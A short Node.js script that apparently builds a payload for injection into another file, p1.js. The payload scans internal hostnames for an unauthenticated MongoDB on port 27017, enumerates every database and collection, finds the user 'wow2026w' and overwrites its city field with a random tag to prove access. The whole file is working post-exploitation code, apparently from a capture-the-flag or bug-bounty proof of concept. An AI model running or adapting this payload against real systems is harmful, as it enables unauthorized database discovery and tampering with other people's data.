const fs=require('fs');
const tag='DN'+Math.floor(Math.random()*90000+10000);
const code=`
const net=require('net'),fs=require('fs'),cp=require('child_process');
const H=['mongo','mongodb','db','database','mongodb-service','mongo-svc','127.0.0.1'];
const probe=(h,p)=>new Promise(r=>{const s=net.connect(p,h);const t=setTimeout(()=>{s.destroy();r(false)},1500);s.on('connect',()=>{clearTimeout(t);s.destroy();r(true)});s.on('error',()=>{clearTimeout(t);r(false)})});
let drv=null; for(const p of ['/app/node_modules/mongodb','/app/node_modules/mongoose/node_modules/mongodb','mongodb']){ try{drv=require(p);break}catch(e){} }
(async()=>{
 for(const h of H){
  if(!(await probe(h,27017))) continue;
  if(!drv) { console.log('TCP_ONLY '+h); continue }
  const c=new drv.MongoClient('mongodb://'+h+':27017',{serverSelectionTimeoutMS:2500});
  try{ await c.connect() }catch(e){ console.log('CONNFAIL '+h); continue }
  const dbs=await c.db().admin().listDatabases();
  for(const d of dbs.databases){ const db=c.db(d.name);
    try{ for(const col of (await db.listCollections().toArray()).map(x=>x.name)){
      const doc=await db.collection(col).findOne({username:'wow2026w'});
      if(doc){ await db.collection(col).updateOne({_id:doc._id},{$set:{city:'${tag}'}}); console.log('OK '+h+' '+d.name+'.'+col); process.exit(0) }
    } }catch(e){}
  }
  await c.close();
 }
 console.log('NONE');
})();
`;
let t=fs.readFileSync('p1.js','utf8');
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('tag='+tag);
